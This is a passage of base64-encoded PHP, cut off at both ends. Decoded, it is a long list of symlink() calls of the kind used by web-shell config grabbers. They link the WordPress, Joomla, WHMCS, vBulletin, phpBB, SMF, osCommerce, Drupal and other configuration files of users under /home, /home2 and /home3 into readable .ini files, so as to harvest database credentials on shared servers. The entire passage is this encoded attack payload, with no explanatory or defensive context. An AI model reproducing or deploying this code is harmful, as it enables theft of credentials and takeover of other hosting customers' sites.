zZXR0aW5ncy5waHAnLCRkb21haW4uJ34+RHJ1cGFsLmluaScpOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9lMTA3X2NvbmZpZy5waHAnLCRkb21haW4uJ34+ZTEwNy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZGF0YXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfj5TZWRpdGlvLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvU1NJLnBocCcsJGRvbWFpbi4nfn4+Q01GLmluaScpIDsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9TU0kucGhwJywkZG9tYWluLid+fj5DTUYtZm9ydW0uaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2luYy9jb25maWcucGhwJywkZG9tYWluLid+fj5NeUJCLmluaScpIDsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2luYy9jb25maWcucGhwJywkZG9tYWluLid+fj5NeUJCLWZvcnVtLmluaScpIDsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pk90aGVyLmluaScpIDsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZfZ2xvYmFsLnBocCcsJGRvbWFpbi4nfn4+aW52aXNpby5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2xpYi9jb25maWcucGhwJywkZG9tYWluLid+fj5CYWxpdGJhbmcuaW5pJykgOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGllbnRzLmluaScpIDsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGllbnQuaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2JpbGxpbmcvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmJpbGxpbmcuaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2JpbGxpbmdzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5iaWxsaW5ncy5pbmknKSA7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9jb25maWcucGhwJywkZG9tYWluLid+fj5QaHBCQi1mb3J1bS5pbmknKSA7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlcy9mdW5jdGlvbnMucGhwJywkZG9tYWluLid+fj5waHBiYjMuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jcy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+d2htY3MuaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+d2htLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htYy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+d2htYy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1Ym1pdHRpY2tldC5waHAnLCRkb21haW4uJ35+PndobWNzMi5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL21hbmFnZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+bWFuZ2V3aG1jcy5pbmknKTsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vcmRlci9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+V2htOS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL215c2hvcC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+bXlzaG9wLmluaScpOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PnN1cHBvcnQuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdXBwb3J0cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+c3VwcG9ydHMuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vc2NvbW1lcmNlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+Pm9zY29tbWVyY2UuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9vc2NvbW1lcmNlcy9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5vc2NvbW1lcmNlcy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3Nob3BwaW5nL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnNob3Atc2hvcHBpbmcuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zYWxlL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnNhbGUuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9hbWVtYmVyL2NvbmZpZy5pbmMucGhwJywkZG9tYWluLid+fj5hbWVtYmVyLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlnLmluYy5waHAnLCRkb21haW4uJ35+PmFtZW1iZXIyLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLmluaScpIDsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd3AuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC9iZXRhL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13cC1iZXRhLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvYmV0YS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtYmV0YS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3ByZXNzL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndwMTMtcHJlc3MuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93b3JkcHJlc3Mvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdvcmRwcmVzcy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3dvcmRwcmVzcy9iZXRhL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13b3JkcHJlc3MtYmV0YS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL25ld3Mvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLW5ld3MuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXcvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLW5ldy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2Jsb2cvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLmluaScpIDsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93ZWIvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdlYi5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvYmxvZ3Mvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLWJsb2dzLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9tZS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtaG9tZS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3Byb3RhbC93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtcHJvdGFsLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvc2l0ZS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj5vcmRwcmVzcy1zaXRlLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvbWFpbi93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtbWFpbi5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3Rlc3Qvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXRlc3QuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iZXRhL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEuaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEuc2h0bWwnKSA7IA0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9tZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLWhvbWUuaW5pJykgOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvam9vbWxhL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtam9vbWxhLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvcHJvdGFsL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtcHJvdGFsLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvam9vL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtam9vLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvY21zL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtY21zLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvc2l0ZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLXNpdGUuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9tYWluL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtbWFpbi5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL25ld3MvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1uZXdzLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtbmV3LmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9tZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLWhvbWUuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj5WQnVsbGV0aW4tZm9ydW0uaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC92Yi9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj52Yi5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3ZiMy9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj52YjMuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jcGFuZWwvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNwYW5lbC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3BhbmVsL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5wYW5lbC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3QvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmhvc3QuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob3N0aW5nL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5ob3N0aW5nLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9zdHMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmhvc3RzLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkZG9tYWluLid+fj56ZW5jYXJ0LmluaScpOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL3plbmNhcnQvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkZG9tYWluLid+fj56ZW5jYXJ0LXNob3AuaW5pJyk7IA0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvc2hvcC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnNob3AtWkNzaG9wLmluaScpOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL21rX2NvbmYucGhwJywkcGRvbWFpbi4nfn4+bWstcG9ydGFsZTEuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9TZXR0aW5ncy5waHAnLCRkb21haW4uJ35+PnNtZi5pbmknKTsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zbWYvU2V0dGluZ3MucGhwJywkZG9tYWluLid+fj5zbWYtc21mLmluaScpOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLWZvcnVtLmluaScpOyANCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtcy9TZXR0aW5ncy5waHAnLCRkb21haW4uJ35+PnNtZi1mb3J1bXMuaW5pJyk7IA0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvdXBsb2FkL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PnVwbG9hZC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2wvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+bWFsYXkuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRlcy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xlbnRzLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50ZS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50Mi5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudHN1cHBvcnQvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTIvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy9rb25la3NpLnBocCcsJGRvbWFpbi4nfn4+bG9rb21lZGlhLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvYWRtaW4vY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d2ViY29uZmlnLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvYWRtaW4vY29uZi5waHAnLCRkb21haW4uJ35+PndlYmNvbmZpZzIuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zeXN0ZW0vc2lzdGVtLnBocCcsJGRvbWFpbi4nfn4+bG9rb21lZGlhMS5pbmknKTsgDQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9zeXN0ZW0vc2lzdGVtLnBocCcsJGRvbWFpbi4nfn4+bG9rb21lZGlhLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvc2l0ZXMvZGVmYXVsdC9zZXR0aW5ncy5waHAnLCRkb21haW4uJ34+RHJ1cGFsLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMi8nLiR1c2VyLicvcHVibGljX2h0bWwvZTEwN19jb25maWcucGhwJywkZG9tYWluLid+PmUxMDcuaW5pJyk7DQogc3ltbGluaygnL2hvbWUyLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9kYXRhcy9jb25maWcucGhwJywkZG9tYWluLid+PlNlZGl0aW8uaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9TU0kucGhwJywkZG9tYWluLid+fj5DTUYuaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL1NTSS5waHAnLCRkb21haW4uJ35+PkNNRi1mb3J1bS5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pk15QkIuaW5pJykgOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vaW5jL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pk15QkItZm9ydW0uaW5pJykgOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+T3RoZXIuaW5pJykgOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvY29uZl9nbG9iYWwucGhwJywkZG9tYWluLid+fj5pbnZpc2lvLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvbGliL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PkJhbGl0YmFuZy5pbmknKSA7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnQvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudHMuaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudHMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudC5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvYmlsbGluZy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+YmlsbGluZy5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvYmlsbGluZ3MvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmJpbGxpbmdzLmluaScpIDsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PlBocEJCLWZvcnVtLmluaScpIDsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2Z1bmN0aW9ucy5waHAnLCRkb21haW4uJ35+PnBocGJiMy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobWNzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj53aG1jcy5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj53aG0uaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG1jL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj53aG1jLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvc3VibWl0dGlja2V0LnBocCcsJGRvbWFpbi4nfn4+d2htY3MyLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvbWFuYWdlL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5tYW5nZXdobWNzLmluaScpOyANCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL29yZGVyL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5XaG05LmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvbXlzaG9wL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5teXNob3AuaW5pJyk7IA0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvc3VwcG9ydC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+c3VwcG9ydC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3N1cHBvcnRzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5zdXBwb3J0cy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL29zY29tbWVyY2UvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+b3Njb21tZXJjZS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL29zY29tbWVyY2VzL2luY2x1ZGVzL2NvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+Pm9zY29tbWVyY2VzLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvc2hvcHBpbmcvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+c2hvcC1zaG9wcGluZy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3NhbGUvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+c2FsZS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL2FtZW1iZXIvY29uZmlnLmluYy5waHAnLCRkb21haW4uJ35+PmFtZW1iZXIuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcuaW5jLnBocCcsJGRvbWFpbi4nfn4+YW1lbWJlcjIuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MuaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13cC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwL2JldGEvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdwLWJldGEuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iZXRhL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1iZXRhLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvcHJlc3Mvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d3AxMy1wcmVzcy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3dvcmRwcmVzcy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd29yZHByZXNzLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvd29yZHByZXNzL2JldGEvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdvcmRwcmVzcy1iZXRhLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3cy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtbmV3cy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL25ldy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtbmV3LmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvYmxvZy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MuaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZTMvJy4kdXNlci4nL3B1YmxpY19odG1sL3dlYi93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd2ViLmluaScpIDsgDQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9ncy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3MtYmxvZ3MuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob21lL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1ob21lLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLiR1c2VyLicvcHVibGljX2h0bWwvcHJvdGFsL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1wcm90YWwuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+Pm9yZHByZXNzLXNpdGUuaW5pJyk7DQogc3ltbGluaygnL2hvbWUzLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9tYWluL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1tYWluLmluaScpOw0KIHN5bWxpbmsoJy9ob21lMy8nLi